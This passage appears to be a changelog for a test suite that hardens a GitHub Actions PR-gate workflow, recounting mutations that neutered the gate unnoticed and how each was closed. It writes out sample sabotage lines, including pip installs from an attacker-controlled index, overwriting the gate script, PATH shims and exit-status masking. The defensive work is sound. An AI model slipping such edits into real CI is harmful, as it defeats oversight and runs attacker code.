different question from a control: it asks whether the *file* still passes after the edit, not whether
one predicate does. A seventh used to be "a second job that carries its own `if:`" — the
one-job rule below retired it, and the entry is named rather than deleted because the cost of that
rule is exactly this: a second job now needs the rule updated, and a reader who finds the old claim
in a diff should know it was withdrawn deliberately.

The doubled shapes are there because **a hundred and seventy-eight of these guards were vacuous on the first
attempt**, in twenty-five waves of 7, 5, 26, 2, 14, 3, 3, 6, 5, 2, 1, 6, 8, 11, 6, 9, 2, 5, 12, 4, 5, 7, 7, 11 and 11 — each wave a narrower version
of one mistake, and each found *after* the previous wave's fix was reported complete. Not every wave
gets a paragraph below, and the paragraphs skip two of the tally's terms: the numbers count waves,
the prose keeps the instructive ones, and two of the small waves appear only in the count.

The first seven tested that a string appeared *somewhere* rather than
that
the job *did* something. Deleting the gate step left its name on the `--requirements` line;
deleting it and leaving a `# TODO` comment defeated the narrower replacement; the branch-scope
rule never excluded comments at all; flipping `fetch-depth: 0` to `1` passed because a comment
two steps below still said `fetch-depth: 0`; and removing `--pr` passed because the fork branch
*echoes* the words "needs `--pr`" while explaining its own absence — which is the useful
correction to the obvious lesson, since that string is neither a comment nor inert-looking. It
is executed, and still proves nothing. The rules now ask where a token appears, not whether. (Two of
the seven are the round-3 pair described below — a guard made conditional on the token it guards, and
`--no-fetch` — which the prose used to describe without counting.)

The next five were the same insight one step further, and they are the reason `executes()` exists:
being *inside* a `run:` body is not the same as running. `echo python scripts/ai/pr_gate.py`
executes a line and runs nothing; `python scripts/ai/pr_gate.py ${SEL} || true` runs the gate and
throws its verdict away; `continue-on-error: true` lets the step fail and the job pass, and lives
outside `run:` entirely, so no rule reading run bodies could ever have seen it. `executes()` answers
the narrower question — is this the command, and does its exit status still reach the job — by
taking the first word of each shell segment (split on `&&`, `||`, `;`, `|` and a bare `&`, outside
quotes; `echo`, `printf`,
`:`, or `true` there means the script is an argument) and rejecting masking in the text that
*follows* that segment, so a cleanup like `rm -f log || true; python …` is still accepted.

**Twenty-six retired the approach rather than extended it.** A line-scoped rule cannot
see the step around a command, and that is where most ways to neutralise one live — so the two
load-bearing steps are read as steps and pinned to a single permitted shape each. For the gate step
that shape is `name` and `run` and nothing else (bar `timeout-minutes`, `shell` and `id`, which cannot
make a failure pass): no `if:`, no `continue-on-error:`, `set -euo pipefail` first, exactly one command
executing the gate, only bare `echo`s around it. The branch-scope step does carry an `if:` and an
`env:` — it has to, since it runs only on `pull_request` and reads the PR number — so for that one the
pin is on the *values*: the condition, the four environment keys and the control-flow sequence are each
fixed, which is why an inserted branch or a falsified condition fails. The `on:` block must contain `pull_request:` and no filter that could skip a PR the default would
have run — a `types:` superset of the default three is allowed, anything else is not; the gate job may carry
only keys that cannot stop it running; `SEL` may only be `--all` or `--base ${BASE}`; and the
checker's `$?` must be captured on the line after it runs. That is a whitelist, deliberately: a
blacklist has to imagine every way to break the job, a whitelist only has to describe the one way it
may work.

**The last fourteen are the reason those whitelists are now read from a parse rather than matched as
text**, and they are the most instructive of the waves, because the whitelist was the right
idea implemented against the wrong representation. A whitelist of *keys* enforced by a regex over
unquoted keys is not a whitelist: `"continue-on-error": true` slipped through it, and so did every
key the regex did not name — `shell: "cat {0}"`, which makes the runner print the script instead of
running it, at step level or as a job-wide `defaults.run.shell`; a step `env:` re-pointing `SEL`. A
whitelist of *job* keys enforced by "the text between `jobs:` and the first `- name:`" is not one
either: `if: false` appended after the `steps:` list lands outside that window, and a decoy job above
the real one collapses it entirely. So the workflow is now parsed — a short stdlib block-YAML reader,
because this suite declares no dependencies and the check that judges the workflow must not be the
one that reports MISSING-DEP and skips — and the parser **refuses** what it cannot model (flow-style
steps, anchors, aliases, duplicate keys, tabs) rather than reading past it, since a step whose keys
are invisible satisfies "only these keys" by having none. Two rules also moved from spelling to
property in the same pass: the gate's invocation is no longer pinned to one literal line but to
"exactly one command *executes* it", and `--no-fetch` need only reach the checker rather than arrive
via `set --`. Both changes were forced by finding that the literal versions rejected correct edits.

The cost of a whitelist is that a legitimate edit to those two steps must update the rule —
acceptable for two steps whose purpose is to be hard to defang, and the six accepted edits listed
above are what keeps that cost honest.

**The last three moved the same question from the line to the step.** `foreground()` asked whether a
*conditional* predecessor could skip the command, which is not the only kind: `exit 0; python
…pr_gate.py ${SEL}` needs no condition, and an `exit 0` on an earlier line of the branch-scope step
leaves every assertion about the checker below it — invoked, `$?` captured, fork branch guarded,
`--no-fetch` supplied — satisfied and unreached. Reachability is a property of the whole step, so a
predecessor that ends the shell now stops the scan, and both load-bearing steps additionally assert
that nothing at their own indentation exits. Nesting is what makes an exit conditional, which is why
the retry loop's own `exit 2` and the single-line `if …; then exit …; fi` are still accepted.

**The last six moved from the line to the segment, and from the command to the program.** Every rule
so far exempted the *line* carrying an invocation once it found the invocation on it, which leaves the
rest of that line unread: `python() { return 0; }; python …pr_gate.py ${SEL}` satisfies "one command
executes the gate" while bash calls a function that returns 0. The branch-scope step had no
per-segment rule at all, so a shim could sit anywhere in it. Shadowing has too many spellings to
enumerate, so both steps are now whitelisted segment by segment against the handful of commands they
exist to run — and a first attempt whitelisting command *words* was itself defeated three times out of
five by its own author before shipping: `python` admits `python -c '…' scripts/ai/pr_gate.py`, which
reads the gate as data; `echo` admits `echo -n > scripts/ai/pr_gate.py`, which truncates it; and a
permitted `echo` can carry a command substitution. So a command taking a subcommand is pinned to the
subcommand (`git fetch`), a conditional to a *test* rather than an arbitrary command, `python` to one
of the two scripts, and neither step may redirect or substitute at all. Segmentation also had to
become quote-aware in the same pass: both steps `echo` strings containing `;`, and a naive split
invents a segment whose first word no whitelist could recognise.

**The last five moved from the program to its arguments — and, twice, to whether the line is a
command at all.** Pinning what runs says nothing about what it is told to do: `python
…check_branch_scope.py --base HEAD --head HEAD --no-fetch` never expands `"$@"`, so every `set --`
form stays in the file, permitted and unused, while the checker compares HEAD with itself and exits
clean; the gate has the same shape with `${SEL}`. `set` had also been filed under *harmless*, which is
the mistake this suite had just fixed for `git` and `python` — a builtin whose arguments decide what
runs is not harmless, and one appended `set -- --base HEAD --head HEAD --no-fetch` leaves every
earlier assertion true. So the `set` forms and both invoking segments are now pinned. The other two
are about segmentation rather than whitelisting, and they invert an assumption this file used to state
outright: that not modelling backslash escapes was *conservative* because it sees more segments than
bash does. Seeing more segments manufactures a command — `echo disabled\; python …pr_gate.py ${SEL}`
is one echo, and the invented second segment is an invocation nothing runs. A heredoc does the same
thing from the other end, turning the lines after it into data that every rule here still reads as
commands. Both are now refused workflow-wide rather than modelled, which costs nothing because the
file contains neither.

**The last two are about what a line *is* before any rule reads it.** Both whitelists above assume
the step is a script executed line by line, and neither the scalar style nor a prefix assignment was
checked. `run: >` folds the step into one line, so `set -euo pipefail` swallows the invocation below
it as positional arguments and the step exits 0 having run nothing — while every rule here still sees
two separate lines and passes. And `permitted()` accepted a segment whose *first* word was an allowed
assignment without reading the rest, so `code=0 eval 'python() { return 0; }'` passed as an
assignment while defining a shim: a prefix assignment is a command's environment, not a command.
Folded scalars are now refused (cheaper than modelling the fold, and the file uses none), and the
assignment forms are pinned like the `set` forms — whitespace-insensitively, because the first cut
rejected `attempt=$((attempt+1))`, a correct respelling.

The folded scalar carries the sharper lesson, though, and it is about the corpus rather than the
workflow: the mutation was **killed before the fix existed**, and by nothing that was guarding
anything. Five controls splice fixtures onto the real gate step's text, so changing its scalar
indicator broke *them*, not a rule — the substantive assertions all passed, exactly as the review
said. A kill by fixture breakage is indistinguishable from a kill by a guard in the summary line, and
had those five controls been synthetic like most of the others, the fold would have sailed through a
green sweep. So "N/N killed" is worth even less than the earlier lesson implies: it is evidence about
the sweep *and* about how incidentally its fixtures are coupled to the artifact.

**The last one is the round-6 mistake at job scope.** Every rule so far was scoped to the step it
protects, and the job's six steps share one working tree: `echo 'import sys; sys.exit(0)' >
scripts/ai/pr_gate.py` in the install step leaves the pinned gate command exactly as written and makes
it a no-op. So do five more — `sed -i` naming the script and `sed -i` through a glob, `cp /tmp/stub.py
scripts/ai/pr_gate.py` and a `cp` into the directory that names nothing, and
`pip install ${reqs} evil-shim`. Four of those six shapes survived the previous round's suite (the two
that died are the subject of the paragraph below). The job is now whitelisted whole — the
six step names, the two pinned actions, a per-segment vocabulary for all four `run:` steps, and
redirection targets restricted to the GitHub-provided files and `/dev/null` — which is the same
whitelist discipline one level up. The level *above* the job was already closed in an earlier round: a
workflow-level `defaults.run.shell` and a workflow-level `env` both die to the rule that no `defaults`
or `env` may sit above the job, which is what a self-sweep of the new rules confirmed rather than
extended.

Two of those six shapes also **died before the fix existed, and for the wrong reason** — the second
instance of the round-8 lesson in as many rounds. `sed -i … scripts/ai/pr_gate.py` and `cp /tmp/stub.py
scripts/ai/pr_gate.py` both failed "exactly one step runs the gate", because *naming the script* in
another step made that step look like a second gate-runner. Spelled to name nothing — a glob, and a
copy into the directory — both sailed through. A mutation that dies for a reason unrelated to its
property is worse than no mutation, because it reports the class as covered.

**The last six are the identities-versus-inputs distinction.** Eleven rounds pinned *what* runs — the
commands, the steps, the actions — and none of them asked what those things were pointed at. Adding
`ref: ${{ github.base_ref }}` to a checkout that still has `fetch-depth: 0` checks out the base branch,
so the diff is the base against itself, the selection is empty, and the gate passes having chosen
nothing. `BASE: HEAD` in the install step's `env` does the same through the other door, leaving both
permitted `SEL` spellings untouched. Dropping `pull-requests: read` from `permissions` is quieter still:
`gh pr view` keeps working while the repo is public and stops the day it is private or mirrored, which
is a regression this workflow has already had once. So the action inputs, both steps' `env` mappings and
the token scopes are now pinned beside the identities.

Sweeping that rule found three more unpinned inputs, and they are worth separating by how bad they
are. `runs-on: self-hosted` moves the gate onto a machine the repository does not control, which
makes the verdict meaningless — a real hole. The job *name* is load-bearing for a different reason:
it is the string a branch ruleset matches, and that ruleset lives outside this repo. The consequence
was stated backwards here until #387's review caught it: a rename does **not** un-require the check.
The ruleset keeps requiring the old context, nothing publishes it, and it sits **Pending** on every
PR to a protected branch — so a rename fails *closed*, as a repo-wide merge outage rather than a
silent bypass. Verifiable rather than asserted: the ruleset stores the requirement as the literal
string `{"context": "Mechanical checks", "integration_id": 15368}` (`gh api
repos/<owner>/<repo>/rulesets/<id>`), so nothing about it changes when the workflow does. #387
demonstrated the identical end state by accident when a skip directive produced no run: required
context unreported, `mergeStateStatus=BLOCKED`. The bypass hazard has the opposite shape and is
covered separately below — a *second* job publishing the same name, because the requirement is
satisfied by the most recent check run bearing it. The concurrency group is the weakest of the three
and is pinned on principle rather than a demonstrated bypass — made constant, one PR's run cancels
another's, and a cancelled run is not a pass but it is also not a verdict. Naming which of the three
is which matters more than pinning all three, because a list of rules that does not say what each
one buys is how the vacuous ones survived this long.

**The last eight are the same lesson one level down: a whitelist of words is not a whitelist of
commands.** The job-scope vocabulary admitted `git` with the subcommands `fetch` and `rev-parse` and
never read their arguments, so `git fetch . "+HEAD:refs/remotes/origin/${BASE_REF}"` moves the base ref
onto the PR head *locally*; the ref export downstream is then honest about a name that now means HEAD,
and the gate diffs HEAD against itself. A segment whose first word was `echo` was trusted whole, so
`echo "$(cp /dev/null scripts/ai/pr_gate.py)"` empties the gate script with no redirection for the
redirection rule to see. Both refspecs and both verifies are now pinned by form, and command *and*
process substitution are refused in every segment except the one assignment that needs one.

The worst of the eight was found by a **local review pass, and it was live**: `printf -v SEL %s '--base
HEAD'`. `printf` sat in the harmless-by-word list, and `printf -v` writes a shell variable from its
argument list — so the line contains no `SEL=` substring, the rule pinning the two SEL spellings never
sees it, and neither does any assignment rule. Run against a real tree it produced exactly the false
green every one of these waves exists to stop: empty diff, every check skipped, exit 0. `printf` now has
its own branch that refuses `-v`, at both scopes.

The other four were narrower and none was live, which is worth saying plainly rather than inflating
them: `permitted()` still admitted `git` by subcommand, leaving the narrow rule looser than the
job-wide one about the very command it guards; the `!` filter dropped negation from *anywhere* in a
segment, so an "exact form" compare accepted `git fetch ! --no-tags origin …`; process substitution was
refused only incidentally, by the workflow-wide ban on `<` whose stated purpose is heredocs; and the
`env:` rule was filtered to the steps it pins, so a step outside the map could carry any env at all.
`git rev-parse --verify HEAD` belongs in this narrower group too — it verifies a ref nothing diffs
against, but an unresolvable base makes `pr_gate` exit 2, which is a red run and not a silent pass.

**The last eleven are one mistake with eleven addresses: a rule written against a *substring* rather
than against the thing it means.** Three were live. The cross-step write rule selected its subject set
by looking for `ref=` or `SEL=` in the line, so `echo "/tmp/shim" >> "$GITHUB_PATH"` was not a subject
of the rule that exists to stop exactly that — it re-points `python` for every later step. The retry
loop's control flow was pinned as a *set* of lines, so wrapping it in `if [ 1 = 2 ]; then … fi` kept
every pinned line present and ran none of them. And reachability was read per line *prefix*, so
`true; exit 0` ended the shell while every assertion about the checker below stayed satisfied.

The other eight are the same error at sites the first three fixes did not touch, and finding them
took asking the question the fixes implied rather than the one they answered — *where else is a rule
selecting its subject by substring, or covering one site of a class?* Five of the eight, the ones worth
naming: a GitHub workflow command needs
no redirection at all (`echo "::set-output name=ref::HEAD"` sets the pinned base-ref output through
stdout, a channel whose subject set cannot contain it by construction). `escapes_early` was applied to
two steps of four, though an `exit 0` atop the resolver empties the base ref just as fatally.
`STEP_KEYS` pinned two steps' keys, so the other two could still take `if: false` or `shell: cat`.
Nothing required the workflow to declare *one* job, so a decoy job could publish the required check
name. And `run_lines` had two copies, so fixing the inline-scalar blind spot in one left a step
spelled `run: id` invisible to the rule that finds the gate at all.

Two of the eleven were **self-inflicted and live**, which is the part worth keeping: they were holes in
rules written earlier the same round, found by a local review pass over the fix itself. `SUMMARY`
admitted a step-summary write by shape using `.*` inside the quotes — greedy and unanchored, so it
spanned an entire earlier command *including its own redirection*, and any line ending in a summary
echo was admitted whole. `escapes_early`'s block exemption keyed on the opener *keyword*, so
`if : ; then exit 0; fi` read as conditional. Both are now closed by the property rather than the
spelling: a line that hands a value to a later step must be a single segment, and an opener is only
exempt if it carries an actual test. The generalisable lesson is that a fix is a change to the rule's
*subject*, and the sweep that follows it only respells the instance — the class has to be enumerated
by hand, at every site, or the next round finds the same mistake at the address you did not visit.

**The fifteenth wave came from five reviewers reading in parallel, and its first finding was the
count itself.** Round 14 had made `EXPECTED` derive its per-step terms from the same iterables the
per-step loops walk — so silencing a loop lowered the expected total by exactly what it silenced, and
the invariant balanced. Measured: emptying the per-shell-step reachability loop, and emptying the
control-flow loop, each left the suite green. The count exists to catch a rule that stopped running,
and for the three loops that round introduced it could no longer do it. It is a hardcoded integer
again; a step added later fails two *named* key rules rather than drifting a total, which is the
right way for that edit to be refused.

Four more were controls that had stopped testing anything. Two restated a rule's condition inline
instead of calling it — a literal compared against a literal from the same source, which passes with
the rule narrowed or deleted — and two had been rewritten on the strength of a comment claiming `::`
was refused workflow-wide, which it is not: display-only annotations are admitted by design, so the
rewrite deleted the only coverage that the *new* `::` rule still accepts the handler this file calls a
correct edit. Both classes now go through the predicate they are about.

**The live hole in this round was produced by fixing a false rejection, and a probe aimed at the fix
found it before it shipped.** The re-raising handler `python … || { echo "::error::…"; exit 1; }` is
documented here as correct, and the segment-wise reachability rule had started rejecting it, so the
rule learned that a terminator after `&&`/`||` is conditional. That admitted
`|| { echo "::error::x"; exit 0; }` — reached only when the gate has *failed*, and then reporting
success. A loosening is where the next hole is, so each one now gets a mutation pointed at it, and a
conditional exit is exempt only if it re-raises (a non-zero literal, or the status it caught).

**And five of eight legitimate edits were being rejected, which nothing in the process was measuring.**
Raising the retry budget from 3 to 5, pinning an action to a commit SHA, adding `timeout-minutes`,
naming `shell: bash`, and writing a step summary from the gate step all failed the suite — the SHA
case being the sharpest, since it refused the *stronger* pin while admitting the movable tag, under a
message about the action patching the tree. The corpus only ever asked whether wrong edits fail, so
there is now a second harness asking whether right ones pass; a rule that fires on correct code is how
rules get deleted rather than fixed. Two of those five turned out to be a property asserted in two
places and fixed in one — the same class as the round before, one address further along.

**The sixteenth wave found four live false greens, and the widest of them was reached by following a
guard's own failure message.** The step-rename failure said "rename it in `JOB_STEPS` and `STEP_KEYS`
together" and named two of the *four* constants keyed on a step name. Do exactly that and the suite
goes green while `JOB_CONTROL` silently stops applying — and the count invariant does not notice,
because the renamed step leaves the control-flow loop (one check fewer) and joins the reachability
loop (one more). Two ordinary commits later, the first prescribed by the guard, the retry loop can be
neutered with the suite fully green. Every name-keyed rule now asserts that the name it keys on matched a
real step, which is the only reason a count invariant can be trusted at all.

The other three were shell and interpreter semantics believed rather than checked. A bare `exit`
was exempted as a re-raise on the belief that it inherits the failure just caught: it inherits `$?`
of the last command *run*, so `|| { echo "::error::x"; exit; }` — one character off the shape this
file documents as correct — printed the annotation and reported success. `subprocess` reports a
signal-killed child as a *negative* returncode, so the `max()` introduced one round earlier to rank
tool errors above verdicts ranked `-9` below `0` and reported an OOM-killed suite as a pass; it is
normalised to 2 in `run()` now, where every caller gets it. And the always-true-test reader knew only
`a = a`, so `[ 1 -eq 1 ]`, `[ 1 == 1 ]`, `[ -n x ]` and four more read as real conditions — enough to
hide an unconditional exit at the top of the branch-scope step.

Five rejections in the same wave were of edits that cannot hide anything: `python3` (the same
interpreter after `setup-python`), `set -euxo pipefail` (which still aborts on the first error, while
the failure message said it does not), `--quiet` on the pip self-upgrade, and two step reorders. Four
of the messages named the wrong rule, which is worse than naming none. Fixing the first two took four
addresses — the invocation pin and both command whitelists at both scopes — and the first attempt
fixed one of them, which is the class this file keeps relearning.

**The seventeenth wave found almost nothing but false rejections — twenty-six of them — and that is
the finding.** A rule that fires on correct code does not get fixed, it gets deleted, so a suite with
twenty-six of them is a suite on its way to being switched off. Most came from one cause: the same
shell vocabulary written out five times with three different contents, so `[[ … ]]` for `[ … ]` and
`while true` for `while :` were accepted by some rules and refused by others — the suite calling two
spellings equivalent in one place and an attempt to shim the interpreter in another. There is now one
definition of the test commands, one of the no-ops, and one of the loop openers. The same shape
explained the rest: `set -Eeuo pipefail` matched against `[a-z]`, which cannot see an uppercase `E`,
and was then reported as no longer aborting on the first error — bash confirms it does; `git rev-parse
--quiet --verify` refused for flag order, in a rule whose own comment *conceded* it rejected that
respelling (conceding a false rejection in a comment is not fixing it — the reader who hits it gets
the failure, not the comment); `--upgrade-strategy eager` read as an appended package because "every
trailing token starts with `-`" cannot tell an option's argument from a payload; and the job key
pinned under a message about check-run names, which come from `name:` and were pinned elsewhere
entirely. Twenty-two of thirty-three failure messages named no editable constant, and the two
catch-alls fired fourteen times between them.

The one hole this wave found in the *suite* was its third instance of a class fixed twice before:
a control loop that splices a mutation into the live workflow, so any edit that moves the anchor makes
the splice a silent no-op and the "mutant" is the real, clean file. Four cosmetic edits — a comment
above the job name, the job name quoted, the job key renamed — each made the suite report that it could no longer
reject `if: false`, `continue-on-error: true` and a swallowing `defaults.run.shell`: three mutations
nobody made, about a rule that still works. The remedy was already sitting next door, applied to five
sibling controls two rounds earlier.

And the loosenings this wave shipped came with probes, which paid for themselves immediately: two of
the eight fixes were live false greens of my own making. Reading `set` flags as a set admitted
`set -n`, which makes bash read the step without executing any of it — both required flags present,
every other rule satisfied, nothing run, exit 0. Canonicalising `true` to `:` was written
`(?:true|false)`, which mapped `while false; do` onto the pinned `while :; do` — a condition
canonicalised to its own opposite. Neither reached a commit. Loosening a rule is writing a new rule,
and a new rule gets swept before it ships.

**The eighteenth wave found five live false greens, two of them shipped by the wave before it, and one
sentence explains all five: a status this suite read as failure that bash reports as success.**
Reading `set` flags case-insensitively — done to admit `set -Eeuo pipefail`, which keeps a real
lowercase `e` — also admitted `set -Euo pipefail`, which has none: `-E` is `errtrace`, a valid option,
so the line ran clean and the gate step silently stopped aborting on error under a check whose message
says it does. `exit 256` was read as re-raising a failure, when bash truncates a status to eight bits
and exits 0. `sleep 0 && exit $?` ended the branch-scope step before its checker ran, because `$?`
hands on a failure only after `||`; after `&&` the predecessor succeeded and `$?` is 0. And
`--index-url=https://…` was accepted by a rule whose own comment listed that option as refused —
refused, it turned out, only in the space-separated spelling, because one word beginning with `-`
satisfied "every trailing token is an option".

The widest of the five is the most instructive, and it is a structural point rather than a bug:
**the masking rule was a blacklist in a file of whitelists** — nearly: the `printf` rule still refuses
`-v` by name, so "a file of whitelists" is the direction of travel and one rule short of a description.
It was written up here as the *last* one,
which was wrong at the time and worth recording as an error rather than quietly correcting: two more —
the `set` flag rule and pip's trailing-option rule — were also blacklists, and both were found to have
holes of precisely this shape a round later, and inverted for precisely this reason. "The last one" is
the kind of claim that stops you looking. `|| sleep 0` discarded the gate's
verdict because `sleep` sits in the harmless-command whitelist while the blacklist of handler commands
did not name it — two whitelists said "a command this step may run" and one blacklist said "nothing to
refuse", and the disagreement was the hole. It is now stated as the property instead: after a
verdict-bearing command, a `||` or `;` tail must end the shell non-zero, which the existing
`reraises()` already knew how to decide in every spelling. That single change also killed
`|| printf ''` and every other non-terminating handler, none of which any blacklist would have named.

Six false-rejection classes came with it, and five were the same *sweep* failure rather than five
distinct bugs: a helper written to stop a pin firing on a respelling (`python3` for `python`) had been
applied at one of the four places that compare an invocation to a pin. Fixing the cited line and
leaving its siblings is how a class survives being fixed, so all four now route through one call.
And the wave's own bookkeeping caught the last one: relocating a loop by four spaces of indentation
pulled six gate-step checks into its body, running each nine times. Nothing failed — the checks all
passed, nine times over — and the total-count invariant is the only thing that noticed.

**The nineteenth wave is the first whose findings were mostly not about the workflow at all, and that is
the finding.** Nine of its twelve live false greens mutate `pr_gate.py` — the script the workflow runs —
and every probe harness up to this point could edit the YAML and almost nothing else (the round-1/2
file reaches `pr_gate.py` for a single trigger-list mutation, and that is the whole of it). A guard suite of 443 checks had grown
around one artifact while the artifact it protects had moved: selection, claim accounting and check argv
all decide whether anything runs, and all three sat outside every sweep. `git diff … -- ":!tests/"`
reported a clean `tests/` tree, so editing this very file selected nothing; `pytest --collect-only`
walked the suites, reported what it found and exited 0; and deleting a whole check left its suite silent
while discovery still printed "none unclaimed".

That last one had a cause worth naming, because no rule could have caught it. `CLAIMED_SUITES` restated
the same paths that `CHECKS` already named, and nothing required the two lists to agree — so "some check
runs this suite" and "this suite is accounted for" were independent facts, and three separate mutations
lived in the gap between them. It is derived from `CHECKS` now, which is not a new rule but the deletion
of the possibility: a path stops being claimed in the same edit that stops running it. The reviewed set
of *deliberate* exclusions is pinned in the test instead, because "we decided not to gate this" is a
decision, and the only mechanism that puts a decision in front of a reviewer is a diff they have to read.

The other three were the same shape as the wave before, in the two places it had been fixed by
blacklist. `set -teuo pipefail` kept the required `e` and `u`, so the flag rule passed it, and `-t` makes
bash execute one command and exit — the `set` being that command, the step reported success having never
run the gate. The pip tail had been repaired by naming payload options and splitting on `=`, which closed
`--index-url=URL` and left `-ihttps://evil/simple`, the glommed short form of the same option, plus
`--no-index`, `--user`, `--trusted-host=` and every other option nobody had thought of. Both are
whitelists now. Enumerating what may not happen requires knowing every flag bash and pip will ever have;
enumerating what may happen requires knowing what this workflow does, which is one install of one pinned
requirement list and a `set` line that turns on errexit.

**The twentieth wave is four spellings of one question the tail rule never asked.** Having inverted the
blacklist into "a `||` or `;` tail must end the shell non-zero", the rule then looked for the first
segment whose command was `exit` and answered on that alone — never asking whether bash *reaches* that
exit, or whether `$?` still holds the verdict when it gets there. So four tails containing a real `exit`
ended the step 0, all four confirmed in bash:
`|| echo "::error::gate failed"; exit $?` (by then `$?` is the echo's zero), the same thing inside the
documented brace group, `|| true && exit $?` (the operator beside the terminator is `&&`, so the exit is
reached only when the *handler* succeeded), and `|| { echo …; if false; then exit 1; fi; }` (a real
`exit 1`, never executed). The first is the one to remember: it differs from the handler this file
documents as *correct* only in a brace group, and reads like an improvement on it — "propagate the real
status" rather than hardcoding 1. A reviewer nodding along would approve it.

The walk now tracks reachability and staleness together, and one distinction it had collapsed turned out
to run in both directions: `$?` and `$code` were a single branch, and they are not the same kind of
thing. `$?` is whatever ran last; `$code` is a variable that already holds the verdict, because
`ALLOWED_ASSIGN` admits no spelling of `code=` other than `code=$?`. Conflated, the pair let
`|| { echo …; exit $?; }` through *and* refused the real workflow's
`if [ "$code" -ne 2 ]; then exit "$code"; fi` for sitting too far from the failure it re-raises.

A crash sat alongside them, and it is the more dangerous defect of the two kinds. A step with no `name:`
— `- uses: actions/cache@v4`, the most ordinary Actions spelling there is — put `None` into a set the
suite then sorted, and `sorted()` cannot order `None` against `str`. Because the failure detail is
evaluated eagerly, it raised on the *passing* iteration, aborting the run about 375 checks early: the
total-count invariant that exists to notice a rule which stopped running never ran either. Three sibling
*messages* had already been given the defensive spelling; their subjects had not.

**Three false rejections came with it, and they matter as much.** `cmd; exit $?` propagates `cmd`'s
status exactly, and both the masking rule and the reachability rule refused it — the second because
"early" had never been given a reference point, so a terminator on the *last* line of the gate step,
handing on a verdict the gate had already produced, counted as ending the shell before the gate ran. It
does now take one (`after=`), and the exemption is confined to terminators the invocation precedes.
`python3 -m pip install ${reqs}` was read as a foreign command, because the dispatch above the pin
normalises `python3` and the pinned forms beside it are literals beginning `python` — the third instance
of a helper that knows something a comparison next to it does not.

**The twenty-first wave is the one to read if you only read one, because its central finding is not a
missing rule but a rule asking the wrong reader.** Two functions decided whether a pip command was the
pinned install. `PIP_FORMS` matched whole commands as literal *prefixes*; anything that missed fell
through to `self_upgrade()`, a classifier written for a different rule, which treats every
unrecognised `-`-prefixed word as an ignorable option. So:

```
python -m pip install -U pip -ihttps://evil.example/simple      # 487/487 checks passed
```

`-U` instead of `--upgrade` breaks the prefix; the glommed `-i` keeps the URL from looking like a bare
package. Two characters of reordering, and CI installs the gate's dependencies from an
attacker-controlled index — arbitrary code execution in the job whose purpose is to be trusted. The
suite already asserted, in eighteen table rows — one of them asserting exactly this `-ihttps://…` form — that a re-pointed index is refused. Every one of those rows
called `pip_tail_ok` **directly**. The authorising path called something else. A table that tests a
helper in isolation says nothing about the decision the workflow actually gets, and the eighteen rows
made the surface look thoroughly covered, which is worse than looking uncovered.

The fix is not to harden `self_upgrade` — whoever writes the next classifier will reuse it as an
authoriser too. One function now decides, on the property rather than on text: the *packages* are
exactly the pinned payload, and every option is in `PIP_OPTS`. Deciding on the property also deleted a
false rejection nobody had reported, because options were only ever legal *after* the payload:
`pip install --quiet ${reqs}` was refused as a foreign command while the trailing spelling passed and
the table asserted `--quiet` was fine.

The same wave found the limit of pinning text at all. `changed_files()`' argv is pinned whole, because
the danger is an *added* argument (`-- ":!tests/"`) and no list of forbidden arguments can be complete.
But a pathspec is not the only way to exclude a tree — a post-filter one line below does it with the
argv untouched:

```python
files = [p for p in diffed.split("\0") if p and not p.startswith("tests/")]
```

Every edit to a suite then selects nothing and the gate passes having chosen to look away, which is the
exact threat the pin's own comment names, and the pin cannot see it. The rule is now behavioural: one
file committed in every top-level tree any check triggers on, all of which must survive the round trip.
Derived from `CHECKS`, because a post-filter can name any tree and a fixture per tree someone thought of
is the enumeration problem again. Writing that fixture reproduced the wave's own lesson in miniature: the
first version left the probe files *untracked*, which reaches selection through `git status` rather than
the diff, so the mutation it was written to kill survived it. A fixture that exercises the wrong half of
a function is the isolated-table finding again, one hour later.

Two more, both about derived facts that were only half-derived. `_claimed_suites()` carries a docstring
promising a path stops being claimed the moment no check names it — and then unioned the two spliced
suite lists in unconditionally, so deleting a whole check left its suites claimed by nobody running
them while discovery printed "none unclaimed". The accounting lie survived inside its own fix. And a
`[0]` on a list that used to be a literal and is now derived from `os.path.isdir` aborted the run on an
`IndexError` if the harness directories ever move — throwing away ~465 checks including, again, the
invariant whose one job is announcing that a rule stopped running. That is the second time in two waves
that an eager crash silenced the count invariant.

**The twenty-second wave is the strongest argument in this file for asking who *else* reads a
predicate, because five of its seven findings are one sentence: a rule was rewritten, and the rewrite
did not reach every branch or every caller.** The wave before it added a walk to
`tail_preserves_status` — the rule deciding whether a tail throws away the gate's verdict — and the
walk was genuinely right. But two branches sat *above* it and returned early, so the rewrite never
applied to them:

```yaml
python scripts/ai/pr_gate.py ${SEL} && true; exit 0    # 503/503 green, exits 0 in bash
python scripts/ai/pr_gate.py ${SEL} | : || true        # 503/503 green, exits 0 in bash
```

Both leading operators are benign on their own, which is what the early returns were reasoning about:
`&&` skips its branch on the failure path, and a pipeline keeps its status under `set -o pipefail`. The
error was answering for the whole tail on the strength of its first two characters. What follows the
operator can still discard the status — a command that is not last in an `&&` list is exempt from
`set -e`, so the shell runs on and reaches the `;` — so the remainder is now asked the same question
instead of being waved through. The masking table had four rows and every one used `||`, which is why
no fixture noticed: the table enumerated *spellings of one operator* rather than the operators.

The pipeline branch also rested on a claim that was not true. Its comment admitted pipelines because
"`set_flags_ok` requires `-o pipefail` of every step" — it was required of exactly one, the gate's.
Dropping `pipefail` from the branch-scope step produced no failure at all. A rule and the rule it
depends on were talking about different steps, so the dependency is now enforced where it is assumed:
every `run` step's opener.

Two more callers had the same shape. `escapes_early`'s positional exemption — added a wave earlier so a
`cmd; exit $?` after the invocation would stop reading as an early exit — asked `executes()` whether the
invocation had been seen, when the function that answers *did this produce a verdict* is `foreground()`.
`executes` accepts `--help`, `--list`, `--requirements`, and segments bash skips. So a single
`check_branch_scope.py --help` disarmed every terminator after it, and `--help` + `exit 0` passed
503/503 while the step printed usage and exited clean. The same predicate was authorising the
assertion that the checker *is executed*, where a `--help` line satisfied it too. Both now use
`foreground`; `step_runs` deliberately keeps `executes`, because there over-matching fails safe.

The other two were narrower. `reraises()` returns True for `$code` unconditionally, on the strength of a
rule pinning `code=$?` to the line after the invocation — but that rule said nothing about *how many*
times `code` is written, and in shell the last write wins, so a second `code=$?` after a `sleep 0` left
`code=0` on every verdict. And `CMD_WORDS`, the whitelist of words a check's argv may contain, carried
`-c` and `pass`, which is precisely `python -c pass`: a check that runs nothing and exits 0. Nothing in
`CHECKS` needed either word — the only argvs using them are this suite's own probes, appended *below*
the assertion, so the whitelist had been widened for a caller that does not exist.

